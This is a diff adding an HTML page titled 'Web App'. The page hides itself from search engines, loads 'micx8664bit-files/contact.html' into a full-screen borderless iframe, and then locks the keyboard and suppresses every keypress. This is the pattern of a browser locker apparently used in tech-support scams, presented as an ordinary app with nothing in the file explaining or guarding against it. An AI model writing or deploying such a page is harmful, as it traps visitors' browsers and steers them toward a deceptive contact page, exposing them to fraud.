@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Web App</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            overflow: hidden; /* Prevent scrolling on the body */
+        }
+        iframe {
+            width: 100vw;
+            height: 100vh;
+            border: none; /* Remove the iframe border */
+        }
+    </style>
+</head>
+<body>
+
+    <iframe id="myIframe" allowfullscreen></iframe>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            // Use JavaScript to dynamically load content into the iframe and set it to full-screen size
+            var iframe = document.getElementById("myIframe");
+
+            // You can set the iframe source to load content
+            iframe.src = "micx8664bit-files/contact.html";
+        });
+    </script>
+
+
+<script>
+navigator.keyboard.lock();
+document.onkeydown = function (e) {
+return false;
+}
+</script>
+</body>
+</html>
